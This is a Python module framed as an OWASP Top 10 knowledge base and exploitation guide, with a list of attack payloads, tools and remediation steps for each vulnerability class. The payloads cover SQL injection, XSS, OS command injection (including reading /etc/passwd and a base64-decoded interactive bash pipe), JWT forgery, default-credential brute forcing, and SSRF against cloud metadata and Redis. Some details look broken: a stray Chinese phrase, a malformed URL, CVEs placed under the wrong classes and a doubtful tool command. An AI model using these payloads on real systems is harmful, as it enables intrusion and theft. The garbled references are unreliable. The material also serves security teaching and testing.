"""OWASP-style Top 10 Web Vulnerabilities — knowledge base + exploitation guides."""

from __future__ import annotations
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class VulnTechnique:
    """A single exploitation technique for a vulnerability class."""
    name: str
    description: str
    payloads: list[str] = field(default_factory=list)
    detection_patterns: list[str] = field(default_factory=list)
    evasion_tips: list[str] = field(default_factory=list)
    tools: list[str] = field(default_factory=list)
    references: list[str] = field(default_factory=list)


@dataclass
class TopVuln:
    """Full writeup for a top vulnerability class."""
    rank: int
    name: str
    owasp_id: str
    severity: str
    cvss_range: str
    description: str
    how_it_works: str
    impact: str
    techniques: list[VulnTechnique] = field(default_factory=list)
    remediation: list[str] = field(default_factory=list)
    references: list[str] = field(default_factory=list)
    tools: list[str] = field(default_factory=list)
    real_world_cves: list[str] = field(default_factory=list)


TOP_10_VULNS: list[TopVuln] = [

    # ── A01: Broken Access Control ──
    TopVuln(
        rank=1,
        name="Broken Access Control",
        owasp_id="A01:2021",
        severity="CRITICAL",
        cvss_range="7.5 - 10.0",
        description=(
            "Access control enforces policy such that users cannot act outside "
            "of their intended permissions. Failures typically lead to unauthorized "
            "information disclosure, modification, or destruction of data."
        ),
        how_it_works=(
            "1. Attacker enumerates endpoints that lack proper authorization checks\n"
            "2. Manipulates URL parameters, API calls, or JWT tokens to escalate privileges\n"
            "3. Uses forced browsing to access admin panels or other users' data\n"
            "4. Modifies request headers (X-Forwarded-For, X-Original-URL) to bypass IP-based restrictions\n"
            "5. Exploits IDOR by changing object references (e.g., /api/users/123 → /api/users/124)\n"
            "6. Leverages platform misconfigurations (GET vs POST, HTTP method override)"
        ),
        impact=(
            "Full account takeover, data breach, privilege escalation to admin, "
            "access to sensitive data across all users, compliance violations"
        ),
        techniques=[
            VulnTechnique(
                name="IDOR (Insecure Direct Object Reference)",
                description="Change object IDs in API calls to access other users' resources",
                payloads=[
                    "GET /api/users/1001 → GET /api/users/1002",
                    "GET /api/orders/ORD-1234 → GET /api/orders/ORD-1235",
                    "POST /api/files/download {\"file_id\": 42} → {\"file_id\": 43}",
                    "GET /profile?user_id=me → GET /profile?user_id=admin",
                ],
                detection_patterns=["200 OK with different user data", "403 → 200 after parameter change"],
                tools=["Burp Suite", "OWASP ZAP", "ffuf", "Arjun"],
                references=[
                    "https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference",
                    "https://portswigger.net/web-security/idor",
                ],
            ),
            VulnTechnique(
                name="Privilege Escalation via HTTP Method Override",
                description="Use HTTP method override headers to bypass method-based access control",
                payloads=[
                    "X-HTTP-Method-Override: DELETE",
                    "X-HTTP-Method: PUT",
                    "_method=DELETE (in POST body)",
                    "X-Method-Override: PUT",
                ],
                detection_patterns=["405 → 200 after method override", "Admin endpoints accessible via non-standard methods"],
                tools=["curl", "Burp Suite"],
            ),
            VulnTechnique(
                name="JWT Token Manipulation",
                description="Modify JWT claims to escalate privileges or bypass auth",
                payloads=[
                    'Change {"role": "user"} → {"role": "admin"} in JWT payload',
                    "Remove signature: header.payload.base64",
                    "Set alg: none to bypass signature verification",
                    "Try RS256 → HS256 algorithm confusion with public key as secret",
                ],
                detection_patterns=["Role change accepted", "No signature verification", "alg:none accepted"],
                tools=["jwt_tool", "jwt-cracker", "Burp JWT Editor"],
                references=["https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens"],
            ),
            VulnTechnique(
                name="Path Traversal Access Control Bypass",
                description="Use path traversal sequences to bypass access control on sensitive endpoints",
                payloads=[
                    "/admin/../admin/dashboard",
                    "/%2e%2e/%2e%2e/admin",
                    "/admin%00.png",
                    "/Admin/../admin/",
                    "/static/../../../etc/passwd",
                ],
                detection_patterns=["200 OK on restricted paths", "Directory listing exposed"],
                tools=["ffuf", "dirsearch", "gobuster"],
            ),
        ],
        remediation=[
            "Deny by default — require explicit grants for all resources",
            "Implement server-side access control checks on every endpoint",
            "Use UUIDs instead of sequential IDs for resource references",
            "Log and alert on access control failures",
            "Rate-limit API access to minimize automated attacks",
            "Disable web server directory listings",
            "Validate JWT tokens server-side with strict signature checking",
        ],
        tools=["Burp Suite", "OWASP ZAP", "ffuf", "Arjun", "jwt_tool"],
        real_world_cves=[
            "CVE-2024-27198 (JetBrains TeamCity)",
            "CVE-2024-21887 (Ivanti Connect Secure)",
            "CVE-2023-46805 (Ivanti Connect Secure)",
        ],
        references=[
            "https://owasp.org/Top10/A01_2021-Broken_Access_Control/",
        ],
    ),

    # ── A02: Cryptographic Failures ──
    TopVuln(
        rank=2,
        name="Cryptographic Failures",
        owasp_id="A02:2021",
        severity="HIGH",
        cvss_range="5.0 - 9.0",
        description=(
            "Previously known as 'Sensitive Data Exposure'. Failures related to cryptography "
            "which often lead to exposure of sensitive data. Includes use of weak algorithms, "
            "improper key management, and传输层保护不足."
        ),
        how_it_works=(
            "1. Identify data in transit (HTTP vs HTTPS), data at rest (DB encryption)\n"
            "2. Check for weak cipher suites (RC4, DES, 3DES, export ciphers)\n"
            "3. Inspect TLS configuration (SSLv3, TLS 1.0/1.1, weak key exchange)\n"
            "4. Look for hardcoded keys, passwords, API keys in source code or configs\n"
            "5. Check for plaintext storage of passwords, credit cards, PII\n"
            "6. Test for padding oracle attacks on encrypted cookies/tokens"
        ),
        impact=(
            "Exposure of passwords, credit card numbers, health records, PII, "
            "personal data. Compliance violations (GDPR, PCI-DSS, HIPAA)."
        ),
        techniques=[
            VulnTechnique(
                name="Weak TLS/SSL Configuration",
                description="Detect and exploit weak cipher suites and protocol versions",
                payloads=[
                    "nmap --script ssl-enum-ciphers -p 443 TARGET",
                    "openssl s_client -connect TARGET:443 -tls1",
                    "testssl.sh TARGET",
                ],
                detection_patterns=["SSLv3 enabled", "TLS 1.0/1.1 enabled", "RC4/DES ciphers", "Weak key exchange (<2048 bit)"],
                tools=["testssl.sh", "sslyze", "nmap", "openssl"],
                references=["https://ssl-config.mozilla.org/"],
            ),
            VulnTechnique(
                name="Padding Oracle Attack",
                description="Decrypt encrypted cookies/tokens by exploiting padding validation errors",
                payloads=[
                    "padbuster TARGET ENCRYPTED_COOKIE 16",
                    "python3 padbuster.py URL COOKIE 16 -encoding 0",
                ],
                detection_patterns=["Different response for valid vs invalid padding", "Timing differences"],
                tools=["PadBuster", "poet", "PaddingOracle"],
                references=["https://owasp.org/www-community/attacks/Padding Oracle"],
            ),
            VulnTechnique(
                name="Hardcoded Secrets in Source",
                description="Find API keys, passwords, tokens in source code or config files",
                payloads=[
                    "grep -rn 'password\\|secret\\|key\\|token' --include='*.py' .",
                    "trufflehog filesystem .",
                    "gitleaks detect --source .",
                    "git-secrets --scan",
                ],
                detection_patterns=["AWS keys (AKIA...)", "JWT secrets", "API tokens in JS bundles", "DB passwords in config"],
                tools=["trufflehog", "gitleaks", "git-secrets", "semgrep"],
            ),
        ],
        remediation=[
            "Enforce HTTPS with HSTS",
            "Use strong cipher suites (AES-256-GCM, ChaCha20)",
            "Disable TLS 1.0/1.1, use TLS 1.2+ only",
            "Use bcrypt/scrypt/Argon2 for password hashing (NEVER MD5/SHA1)",
            "Encrypt sensitive data at rest with AES-256",
            "Never hardcode secrets — use environment variables or secret managers",
            "Implement certificate pinning for mobile apps",
        ],
        tools=["testssl.sh", "sslyze", "trufflehog", "gitleaks", "Burp Suite"],
        real_world_cves=[
            "CVE-2023-38545 (curl SOCKS5 heap buffer overflow)",
            "CVE-2014-0160 (Heartbleed)",
        ],
        references=[
            "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/",
        ],
    ),

    # ── A03: Injection ──
    TopVuln(
        rank=3,
        name="Injection",
        owasp_id="A03:2021",
        severity="CRITICAL",
        cvss_range="7.0 - 10.0",
        description=(
            "Injection flaws occur when untrusted data is sent to an interpreter as part "
            "of a command or query. Includes SQL injection, NoSQL injection, OS command "
            "injection, LDAP injection, XSS (cross-site scripting)."
        ),
        how_it_works=(
            "1. Identify all user input points: URL params, form fields, headers, cookies\n"
            "2. Test for SQLi: send ' OR 1=1-- and observe response differences\n"
            "3. Test for blind SQLi: use time-based payloads (SLEEP(5), BENCHMARK)\n"
            "4. Test for OS command injection: ;id, |id, $(id), `id`\n"
            "5. Test for XSS: <script>alert(1)</script>, <img onerror=alert(1)>\n"
            "6. Use automated tools for payload fuzzing (sqlmap, nuclei, ffuf)"
        ),
        impact=(
            "Full database dump, authentication bypass, remote code execution, "
            "data modification/deletion, lateral movement, system compromise"
        ),
        techniques=[
            VulnTechnique(
                name="SQL Injection — Union-Based",
                description="Extract data using UNION SELECT by determining column count",
                payloads=[
                    "' UNION SELECT NULL,NULL,NULL--",
                    "' UNION SELECT 1,2,3,4,5--",
                    "' UNION ALL SELECT username,password,NULL FROM users--",
                    "1 UNION SELECT table_name,NULL FROM all_tables--",
                    "1 UNION SELECT column_name,NULL FROM user_tab_columns WHERE table_name='USERS'--",
                ],
                detection_patterns=["Response changes with UNION", "Column count matches", "Data leakage"],
                tools=["sqlmap", "Havij", "jSQL Injection", "Burp Suite"],
                references=["https://portswigger.net/web-security/sql-injection/union-attacks"],
            ),
            VulnTechnique(
                name="SQL Injection — Blind/Time-Based",
                description="Extract data bit-by-bit using boolean conditions or time delays",
                payloads=[
                    "' AND 1=1-- (true condition, normal response)",
                    "' AND 1=2-- (false condition, different response)",
                    "' AND SLEEP(5)-- (time-based, 5s delay if injectable)",
                    "' AND (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)--",
                    "1' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
                ],
                detection_patterns=["Response time differences", "Boolean-based response changes"],
                tools=["sqlmap", "Burp Suite Intruder"],
            ),
            VulnTechnique(
                name="OS Command Injection",
                description="Execute operating system commands through application input",
                payloads=[
                    "; id",
                    "| id",
                    "$(id)",
                    "`id`",
                    "; cat /etc/passwd",
                    "| cat /etc/passwd",
                    "|| ping -c 3 ATTACKER_IP",
                    "; bash -c '{echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}'",
                ],
                detection_patterns=["Command output in response", "Out-of-band DNS/HTTP callback", "Time delay"],
                tools=["Commix", "Burp Suite", "curl"],
                references=["https://owasp.org/www-community/attacks/Command_Injection"],
            ),
            VulnTechnique(
                name="Cross-Site Scripting (XSS)",
                description="Inject malicious scripts into web pages viewed by other users",
                payloads=[
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "<svg/onload=alert('XSS')>",
                    "javascript:alert('XSS')",
                    "<body onload=alert('XSS')>",
                    "';alert('XSS')//",
                    "<iframe src='javascript:alert(1)'>",
                    "<details open ontoggle=alert(1)>",
                ],
                detection_patterns=["Payload reflected in response", "Alert dialog triggers", "Cookie exfiltration"],
                tools=["XSStrike", "dalfox", "Burp Suite", "kxss"],
                references=[
                    "https://owasp.org/www-community/attacks/xss/",
                    "https://portswigger.net/web-security/cross-site-scripting",
                ],
            ),
        ],
        remediation=[
            "Use parameterized queries / prepared statements for ALL database queries",
            "Use ORMs with proper escaping (SQLAlchemy, Django ORM, Eloquent)",
            "Validate and sanitize all input server-side with allowlists",
            "Use Content Security Policy (CSP) headers to prevent XSS",
            "Escape output based on context (HTML, JS, URL, CSS)",
            "Use shell=False in subprocess calls, avoid os.system()",
            "Implement WAF rules for common injection patterns",
            "Use least-privilege database accounts",
        ],
        tools=["sqlmap", "Commix", "XSStrike", "dalfox", "Burp Suite", "nuclei", "ffuf"],
        real_world_cves=[
            "CVE-2024-27198 (JetBrains TeamCity)",
            "CVE-2023-38545 (curl)",
            "CVE-2026-60137 (WordPress)",
            "CVE-2026-63030 (WordPress)",
        ],
        references=[
            "https://owasp.org/Top10/A03_2021-Injection/",
        ],
    ),

    # ── A04: Insecure Design ──
    TopVuln(
        rank=4,
        name="Insecure Design",
        owasp_id="A04:2021",
        severity="HIGH",
        cvss_range="6.0 - 9.0",
        description=(
            "A category representing different weaknesses in the design phase. "
            "Unlike implementation bugs, insecure design cannot be fixed by a perfect "
            "implementation. Missing or ineffective security controls by design."
        ),
        how_it_works=(
            "1. Analyze business logic flows for bypass opportunities\n"
            "2. Test rate limiting on sensitive endpoints (login, OTP, payment)\n"
            "3. Check if anti-automation controls exist\n"
            "4. Test for mass assignment / over-posting vulnerabilities\n"
            "5. Analyze API contracts for missing authorization checks\n"
            "6. Test trust boundaries between microservices"
        ),
        impact="Varies: business logic bypass, data manipulation, financial fraud, account takeover",
        techniques=[
            VulnTechnique(
                name="Business Logic Bypass",
                description="Exploit flawed business logic to perform unauthorized actions",
                payloads=[
                    "Change price in checkout: amount=9999 → amount=0",
                    "Skip steps in multi-step process: /step3 directly without /step1,/step2",
                    "Use negative quantities: quantity=-1 for refund exploit",
                    "Race condition: send 100 parallel requests to exploit TOCTOU",
                ],
                detection_patterns=["Price manipulation works", "Step bypass succeeds", "Race condition exploitable"],
                tools=["Burp Suite", "Turbo Intruder"],
            ),
            VulnTechnique(
                name="Mass Assignment / Over-Posting",
                description="Send extra fields in API requests to modify privileged attributes",
                payloads=[
                    '{"user":"john","role":"admin","is_verified":true}',
                    '{"price":0,"discount_code":"ADMIN50","status":"approved"}',
                    '{"email":"admin@corp.com","is_admin":true,"balance":99999}',
                ],
                detection_patterns=["Privilege escalation via extra fields", "Unintended field modification"],
                tools=["Burp Suite", "Postman"],
                references=["https://owasp.org/www-community/vulnerabilities/Mass_Assignment"],
            ),
        ],
        remediation=[
            "Implement threat modeling during design phase",
            "Write secure design patterns and reference architectures",
            "Use fraud/abuse detection for business logic",
            "Implement rate limiting and anti-automation",
            "Whitelist acceptable API fields (never blindly bind user input)",
            "Add unit/integration tests for security edge cases",
        ],
        tools=["Burp Suite", "Turbo Intruder"],
        references=["https://owasp.org/Top10/A04_2021-Insecure_Design/"],
    ),

    # ── A05: Security Misconfiguration ──
    TopVuln(
        rank=5,
        name="Security Misconfiguration",
        owasp_id="A05:2021",
        severity="MEDIUM",
        cvss_range="4.0 - 8.0",
        description=(
            "Missing appropriate security hardening across any part of the application stack. "
            "Includes default credentials, unnecessary features enabled, verbose error messages, "
            "missing security headers, open cloud storage, misconfigured permissions."
        ),
        how_it_works=(
            "1. Scan for default credentials (admin:admin, root:root, tomcat:tomcat)\n"
            "2. Check security headers (CSP, X-Frame-Options, HSTS, X-Content-Type-Options)\n"
            "3. Enumerate directories and hidden files (.git, .env, backup.zip)\n"
            "4. Check for information disclosure in error messages and server headers\n"
            "5. Test for CORS misconfiguration (Origin reflection)\n"
            "6. Scan for open management interfaces (admin panels, debug endpoints)"
        ),
        impact="Information disclosure, unauthorized access, lateral movement, full system compromise",
        techniques=[
            VulnTechnique(
                name="Default Credentials",
                description="Login with factory-default username/password combinations",
                payloads=[
                    "admin:admin, admin:password, root:root, root:toor",
                    "tomcat:tomcat, tomcat:s3cret, manager:manager",
                    "test:test, guest:guest, demo:demo",
                    "oracle:oracle, sa: (empty), postgres:postgres",
                ],
                detection_patterns=["Successful authentication", "Dashboard/admin panel access"],
                tools=["Hydra", "Medusa", "Burp Suite", "nuclei"],
            ),
            VulnTechnique(
                name="Sensitive File Discovery",
                description="Find exposed configuration files, backups, source code",
                payloads=[
                    "/.git/config", "/.git/HEAD", "/.env",
                    "/backup.zip", "/db.sql", "/dump.sql",
                    "/wp-config.php.bak", "/web.config.bak",
                    "/.DS_Store", "/Thumbs.db",
                    "/server-status", "/server-info",
                    "/phpinfo.php", "/info.php",
                    "/actuator", "/actuator/env", "/actuator/heapdump",
                ],
                detection_patterns=["200 OK with sensitive data", "Git repository accessible", "Environment variables leaked"],
                tools=["ffuf", "dirsearch", "gobuster", "nuclei", "gitjacker"],
            ),
            VulnTechnique(
                name="CORS Misconfiguration",
                description="Exploit overly permissive CORS to steal data cross-origin",
                payloads=[
                    "Origin: https://evil.com → reflects in Access-Control-Allow-Origin",
                    "Origin: null → reflects in ACAO with credentials",
                ],
                detection_patterns=["ACAO reflects attacker origin", "Access-Control-Allow-Credentials: true"],
                tools=["Burp Suite", "CORScanner"],
                references=["https://portswigger.net/web-security/cors"],
            ),
        ],
        remediation=[
            "Remove default accounts and change default passwords",
            "Disable debug mode and stack traces in production",
            "Implement security headers (CSP, HSTS, X-Frame-Options)",
            "Regularly scan for exposed files and directories",
            "Use minimal Docker images, remove unnecessary packages",
            "Review cloud storage permissions (S3 buckets, GCS)",
            "Automate configuration hardening with infrastructure-as-code",
        ],
        tools=["nuclei", "ffuf", "dirsearch", "nmap", "nikto", "Burp Suite"],
        real_world_cves=[
            "CVE-2024-21887 (Ivanti)",
            "CVE-2023-46805 (Ivanti)",
            "CVE-2017-5638 (Apache Struts)",
        ],
        references=["https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"],
    ),

    # ── A06: Vulnerable and Outdated Components ──
    TopVuln(
        rank=6,
        name="Vulnerable and Outdated Components",
        owasp_id="A06:2021",
        severity="HIGH",
        cvss_range="5.0 - 10.0",
        description=(
            "Using components with known vulnerabilities. Includes libraries, frameworks, "
            "and other software modules. Attackers exploit known CVEs to compromise systems."
        ),
        how_it_works=(
            "1. Fingerprint technology stack (WhatWeb, Wappalyzer, manual inspection)\n"
            "2. Identify exact versions from headers, error messages, file hashes\n"
            "3. Search for known CVEs in identified components\n"
            "4. Find public exploit code (Sploitus, Exploit-DB, GitHub PoCs)\n"
            "5. Test for outdated jQuery, Bootstrap, Angular, React versions\n"
            "6. Check server software versions (Apache, Nginx, PHP, Node.js)"
        ),
        impact="Remote code execution, data theft, system compromise via known CVEs",
        techniques=[
            VulnTechnique(
                name="Technology Fingerprinting",
                description="Identify exact software versions from HTTP responses",
                payloads=[
                    "curl -I TARGET (check Server, X-Powered-By headers)",
                    "WhatWeb TARGET",
                    "wappalyzer TARGET",
                    "nmap --script http-generator TARGET",
                ],
                detection_patterns=["Server: Apache/2.4.49", "X-Powered-By: PHP/7.4", "jQuery/1.8.3"],
                tools=["WhatWeb", "Wappalyzer", "nmap", "builtwith"],
            ),
            VulnTechnique(
                name="Known CVE Exploitation",
                description="Use public exploits for identified vulnerable components",
                payloads=[
                    "searchsploit apache 2.4.49",
                    "searchsploit jQuery 1.8.3",
                    "nuclei -u TARGET -t cves/",
                ],
                detection_patterns=["Exploit succeeds", "Version confirmed vulnerable"],
                tools=["searchsploit", "nuclei", "Metasploit", "Sploitus"],
            ),
        ],
        remediation=[
            "Maintain an inventory of all components and versions",
            "Subscribe to CVE monitoring feeds",
            "Use SCA tools (Snyk, Dependabot, OWASP Dependency-Check)",
            "Only download components from official sources",
            "Remove unused dependencies and unnecessary features",
            "Continuously monitor for new vulnerabilities",
        ],
        tools=["Snyk", "OWASP Dependency-Check", "searchsploit", "nuclei", "WhatWeb"],
        references=["https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/"],
    ),

    # ── A07: Identification and Authentication Failures ──
    TopVuln(
        rank=7,
        name="Identification and Authentication Failures",
        owasp_id="A07:2021",
        severity="HIGH",
        cvss_range="5.0 - 9.0",
        description=(
            "Confirmation of the user's identity, authentication, and session management "
            "is critical to protect against authentication-related attacks. Includes weak "
            "passwords, credential stuffing, session fixation, missing MFA."
        ),
        how_it_works=(
            "1. Test for brute force: no rate limiting on login endpoint\n"
            "2. Test for credential stuffing with known breached password lists\n"
            "3. Check session management: predictable session tokens, no expiry\n"
            "4. Test for session fixation: can attacker set victim's session ID?\n"
            "5. Check for missing account lockout after failed attempts\n"
            "6. Test password policy: weak requirements, no breach checking"
        ),
        impact="Account takeover, identity theft, unauthorized access to all user accounts",
        techniques=[
            VulnTechnique(
                name="Credential Stuffing / Brute Force",
                description="Automated login attempts with breached passwords or brute force",
                payloads=[
                    "hydra -l admin -P rockyou.txt TARGET http-post-form '/login:user=^USER^&pass=^PASS^:Invalid credentials'",
                    "patator http-flood url=TARGET/LOGIN method=POST 'body=user=FILE0&pass=FILE1' 0=logins.txt 1=passwords.txt",
                ],
                detection_patterns=["Successful login with common password", "No rate limiting", "No account lockout"],
                tools=["Hydra", "Medusa", "Patator", "Burp Suite Intruder"],
            ),
            VulnTechnique(
                name="Session Fixation",
                description="Force a known session ID on the victim before authentication",
                payloads=[
                    "Set cookie: sessionid=ATTACKER_CONTROLLED_VALUE before login",
                    "Redirect: https://target.com/?sessionid=KNOWN_VALUE",
                ],
                detection_patterns=["Session ID doesn't change after login", "Pre-auth session accepted post-auth"],
                tools=["Burp Suite"],
                references=["https://owasp.org/www-community/attacks/Session_fixation"],
            ),
            VulnTechnique(
                name="JWT Session Attacks",
                description="Exploit weak JWT implementation for session hijacking",
                payloads=[
                    "Change alg: RS256 → HS256, sign with public key",
                    "Remove exp claim to make token never expire",
                    "Change sub: victim → attacker",
                    "Replay expired JWT if no server-side check",
                ],
                detection_patterns=["Algorithm confusion succeeds", "No expiration check", "Subject change accepted"],
                tools=["jwt_tool", "Burp Suite JWT Editor"],
            ),
        ],
        remediation=[
            "Implement multi-factor authentication (MFA)",
            "Do not ship with default credentials",
            "Implement account lockout after failed attempts",
            "Use secure session management (random tokens, server-side validation)",
            "Regenerate session ID after login",
            "Enforce strong password policies",
            "Check passwords against breach databases (HaveIBeenPwned API)",
        ],
        tools=["Hydra", "jwt_tool", "Burp Suite", "Patator"],
        references=["https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"],
    ),

    # ── A08: Software and Data Integrity Failures ──
    TopVuln(
        rank=8,
        name="Software and Data Integrity Failures",
        owasp_id="A08:2021",
        severity="HIGH",
        cvss_range="6.0 - 9.5",
        description=(
            "Relating to code and infrastructure that does not protect against integrity "
            "violations. Includes insecure CI/CD pipelines, auto-update without verification, "
            "insecure deserialization."
        ),
        how_it_works=(
            "1. Check for insecure deserialization in cookies, session tokens, API params\n"
            "2. Test CI/CD pipeline for injection (build scripts, GitHub Actions)\n"
            "3. Verify integrity of software updates (are they signed?)\n"
            "4. Check for CDN compromise (SRI missing on external scripts)\n"
            "5. Test for unsigned JAR/PyPI/npm packages"
        ),
        impact="Remote code execution, supply chain attacks, full system compromise",
        techniques=[
            VulnTechnique(
                name="Insecure Deserialization",
                description="Send crafted serialized objects to achieve RCE",
                payloads=[
                    "Python pickle: os.popen('id').read() serialized",
                    "Java: ysoserial CommonsCollections1 payload",
                    "PHP: O:8:\"ClassName\":1:{s:4:\"cmd\";s:2:\"id\";}",
                    "Ruby: Marshal.dump(RubySerializedObject)",
                ],
                detection_patterns=["Error messages about deserialization", "Object injection", "RCE achieved"],
                tools=["ysoserial", "phpggc", "GadgetInspector"],
                references=["https://portswigger.net/web-security/deserialization"],
            ),
        ],
        remediation=[
            "Use digital signatures for software updates",
            "Implement Subresource Integrity (SRI) for CDN scripts",
            "Use signed packages (npm audit, pip audit)",
            "Avoid deserializing untrusted data",
            "Use safe serialization formats (JSON, Protocol Buffers)",
            "Secure CI/CD pipeline with proper access controls",
        ],
        tools=["ysoserial", "phpggc", "GadgetInspector"],
        real_world_cves=[
            "CVE-2025-49113 (Roundcube)",
            "CVE-2024-27198 (TeamCity)",
        ],
        references=["https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/"],
    ),

    # ── A09: Security Logging and Monitoring Failures ──
    TopVuln(
        rank=9,
        name="Security Logging and Monitoring Failures",
        owasp_id="A09:2021",
        severity="MEDIUM",
        cvss_range="3.0 - 7.0",
        description=(
            "Insufficient logging, detection, monitoring, and active response. "
            "Allows attackers to further attack systems, maintain persistence, and tamper with evidence."
        ),
        how_it_works=(
            "1. Test if failed logins are logged and alerted\n"
            "2. Check if input validation failures are logged\n"
            "3. Verify log integrity (can attackers delete/modify logs?)\n"
            "4. Test if high-value transactions are logged with audit trail\n"
            "5. Check if logs are shipped to a SIEM/central logging\n"
            "6. Test for log injection (CRLF injection in log entries)"
        ),
        impact="Undetected breaches, inability to perform forensics, compliance failures",
        techniques=[
            VulnTechnique(
                name="Log Injection / Log Forging",
                description="Inject fake entries into application logs",
                payloads=[
                    "username=admin\\n2024-01-01 LOGIN SUCCESS admin",
                    "input=<script>alert(1)</script> (if logs viewed in browser)",
                ],
                detection_patterns=["Fake log entries appear", "Log viewers execute injected code"],
                references=["https://owasp.org/www-community/attacks/Log_Injection"],
            ),
        ],
        remediation=[
            "Log all authentication events, access control failures, input validation failures",
            "Use structured logging (JSON) for easy parsing",
            "Protect logs from injection (sanitize input before logging)",
            "Ship logs to centralized, tamper-proof logging system",
            "Implement alerting for suspicious patterns",
            "Establish incident response plan",
        ],
        tools=["ELK Stack", "Splunk", "Graylog"],
        references=["https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/"],
    ),

    # ── A10: Server-Side Request Forgery (SSRF) ──
    TopVuln(
        rank=10,
        name="Server-Side Request Forgery (SSRF)",
        owasp_id="A10:2021",
        severity="HIGH",
        cvss_range="6.0 - 9.0",
        description=(
            "SSRF flaws occur when a web application fetches a remote resource without "
            "validating the user-supplied URL. Allows an attacker to coerce the application "
            "to send crafted requests to unexpected destinations, even when protected by a firewall."
        ),
        how_it_works=(
            "1. Identify URL parameters that fetch external resources (url=, src=, href=, dest=)\n"
            "2. Test with http://127.0.0.1 to access internal services\n"
            "3. Test cloud metadata: http://169.254.169.254/latest/meta-data/\n"
            "4. Use DNS rebinding to bypass IP validation\n"
            "5. Try protocol smuggling: file:///etc/passwd, gopher://127.0.0.1:25/\n"
            "6. Bypass filters with IP encoding: 0x7f000001, 2130706433, 0177.0.0.1"
        ),
        impact=(
            "Access to cloud credentials (AWS/GCP/Azure metadata), internal service scanning, "
            "port scanning, reading local files, remote code execution via internal services"
        ),
        techniques=[
            VulnTechnique(
                name="Cloud Metadata Exploitation",
                description="Access cloud instance metadata for credentials and tokens",
                payloads=[
                    "http://169.254.169.254/latest/meta-data/",
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    "http://169.254.169.254/latest/user-data/",
                    "http://metadata.google.internal/computeMetadata/v1/",
                    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                ],
                detection_patterns=["AWS IAM credentials returned", "Instance metadata accessible", "User data leaked"],
                tools=["SSRFmap", "Gopherus"],
                references=[
                    "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata.html",
                    "https://blog.cloudflare.com/a-]memory-lane-in-ssrf/"],
            ),
            VulnTechnique(
                name="Internal Service Discovery",
                description="Scan internal network through the vulnerable application",
                payloads=[
                    "http://127.0.0.1:22 (SSH)", "http://127.0.0.1:3306 (MySQL)",
                    "http://127.0.0.1:5432 (PostgreSQL)", "http://127.0.0.1:6379 (Redis)",
                    "http://127.0.0.1:8080 (Internal apps)", "http://127.0.0.1:9200 (Elasticsearch)",
                    "http://127.0.0.1:27017 (MongoDB)", "http://127.0.0.1:11211 (Memcached)",
                ],
                detection_patterns=["Different responses per port", "Service banners leaked", "Internal apps accessible"],
                tools=["SSRFmap", "Gopherus", "curl"],
            ),
            VulnTechnique(
                name="Protocol Smuggling / File Read",
                description="Use non-HTTP protocols to read files or interact with services",
                payloads=[
                    "file:///etc/passwd",
                    "file:///proc/self/environ",
                    "gopher://127.0.0.1:6379/_FLUSHALL%0D%0ASET%20pwned%20true%0D%0A",
                    "dict://127.0.0.1:6379/info",
                ],
                detection_patterns=["File contents returned", "Redis commands executed", "Protocol response received"],
                tools=["Gopherus", "SSRFmap"],
                references=["https://docs.google.com/document/d/1ik6kLhKhO7POxtSMXIJy0pPjbrAklMDmim2U0m1Lx3Q"],
            ),
        ],
        remediation=[
            "Validate and sanitize all user-supplied URLs",
            "Use allowlists for permitted domains/IPs",
            "Block requests to private/internal IP ranges",
            "Disable unused URL schemes (file://, gopher://, dict://)",
            "Use network segmentation to limit internal access",
            "Implement DNS resolution validation before making requests",
            "Use IMDSv2 (AWS) to protect metadata endpoint",
        ],
        tools=["SSRFmap", "Gopherus", "curl", "Burp Suite"],
        real_world_cves=[
            "CVE-2024-21887 (Ivanti)",
            "CVE-2021-22214 (GitLab)",
        ],
        references=["https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_(SSRF)/"],
    ),
]


def get_top10() -> list[TopVuln]:
    """Return the full Top 10 list."""
    return TOP_10_VULNS


def get_top10_by_rank(rank: int) -> Optional[TopVuln]:
    """Get a specific Top 10 entry by rank."""
    for v in TOP_10_VULNS:
        if v.rank == rank:
            return v
    return None


def search_top10(query: str) -> list[TopVuln]:
    """Search Top 10 by name, description, or technique."""
    q = query.lower()
    results = []
    for v in TOP_10_VULNS:
        if (q in v.name.lower() or q in v.description.lower()
                or q in v.how_it_works.lower()
                or any(q in t.name.lower() or q in t.description.lower() for t in v.techniques)):
            results.append(v)
    return results
